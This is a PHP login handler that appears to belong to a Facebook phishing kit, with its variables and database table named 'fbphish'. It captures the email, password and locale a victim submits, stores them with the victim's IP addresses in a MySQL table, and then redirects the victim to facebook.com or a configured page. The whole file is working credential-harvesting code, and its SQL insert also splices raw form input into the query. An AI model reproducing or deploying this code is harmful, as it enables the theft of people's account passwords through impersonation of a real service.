<?php
// Set SUPER Vars
$fullpath = dirname(__FILE__);

// Require...
require("$fullpath/config.inc.php");

// Check if register form is NOT submitted
if($_POST['submit'] != "true"){
	switch($config_option__287){
		case "facebook":
			header("Location: https://facebook.com");
			break;
		case "home":
			header("Location: /index.php");
			break;
		default:
			header("Location: $config_option__287");
	}
}

// Check if register form is submitted
if(isset($_POST['submit'])){
	// Set variables
	$user_ip = getIp();
	$meta_user_ip = getMetaIp();
	$missing = array();

	// Check if variable is empty
	if(empty($_POST['email'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Email missing";
	}else{
		// Else set the variable
		$email = $_POST['email'];
	}

	// Check if variable is empty
	if(empty($_POST['pass'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Password missing";
	}else{
		// Else set the variable
		$passwd = $_POST['pass'];
	}

	// Check if variable is empty
	if(empty($_POST['locale'])){
		// If empty then put message in the array() "missing"
		$missing[] = "Locale missing";
	}else{
		// Else set the variable
		$locale = $_POST['locale'];
	}

	// Check if there are any missing(s) variables
	if(!empty($missing)){
		// If there are any missing(s) then make the "complete" false
		$complete = "false";
		// Turn the missing variable into a string
		$missing_string = implode('; ', $missing);
	}else{
		// If there no missing(s) then make the "complete" true
		$complete = "true";
		// Set missing to NULL
		$missing = "NULL";
	}

	// Database connect and insert
	try{
		// Connect
	    $fbphish_database_conn = new PDO("mysql:host=$fbphish_sql_host;dbname=$fbphish_sql_db", $fbphish_sql_user, $fbphish_sql_password);
	    // set the PDO error mode to exception
	    $fbphish_database_conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	    $fbphish_database_conn->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
	    // Set the sql query
		$fbphish_sql_query_insertRegisterData = "INSERT INTO `fbphish_data` (`id`, `type`, `record_date`, `first_name`, `last_name`, `email`, `email_confirm`, `password`, `birthday_day`, `birthday_month`, `birthday_year`, `sex`, `locale`, `user_ip`, `meta_user_ip`, `missing`) VALUES (NULL, 'login', CURRENT_TIMESTAMP, '0', '0', '$email', '0', '$passwd', '0', '0', '0', '0', '$locale', '$user_ip', '$meta_user_ip', '$missing_string');";
		// Execute sql
		$fbphish_database_conn->exec($fbphish_sql_query_insertRegisterData);
	}catch(PDOException $fbphish_database_conn_err){
		// Error reporting
		switch($config_option__451){
			case "facebook":
				header("Location: https://facebook.com");
				break;
			case "home":
				header("Location: /index.php");
				break;
			case "show":
				echo "Connection failed: " . $fbphish_database_conn_err->getMessage();
				break;
			default:
				header("Location: $config_option__451");
		}
	}
	// Close connection
	$fbphish_database_conn = null;

	// If complete is "true" execute code/sql
	if($complete == "true"){
		switch($config_option__301){
			case "facebook":
				header("Location: https://facebook.com");
				break;
			case "home":
				header("Location: /index.php");
				break;
			default:
				header("Location: $config_option__301");
		}
	}elseif($complete == "false"){
		switch($config_option__302){
			case "facebook":
				header("Location: https://facebook.com");
				break;
			case "home":
				header("Location: /index.php");
				break;
			default:
				header("Location: $config_option__302");

		}
	}
}


